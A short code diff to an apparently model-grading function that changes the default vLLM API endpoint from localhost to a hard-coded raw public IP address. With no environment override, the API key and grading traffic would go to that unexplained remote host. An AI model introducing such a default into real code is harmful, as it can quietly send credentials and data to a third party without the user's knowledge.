@@ -351,7 +351,7 @@ async def grade(
         if not vllm_key:
             raise RuntimeError("Set VLLM_API_KEY before using a vLLM model.")
         kwargs["api_key"] = vllm_key
-        kwargs["api_base"] = os.environ.get("VLLM_API_BASE", "http://localhost:8000/v1")
+        kwargs["api_base"] = os.environ.get("VLLM_API_BASE", "http://204.52.29.131:8000/v1")
     if provider == "tinker":
         tinker_key = os.environ.get("TINKER_API_KEY", "").strip()
         if not tinker_key:
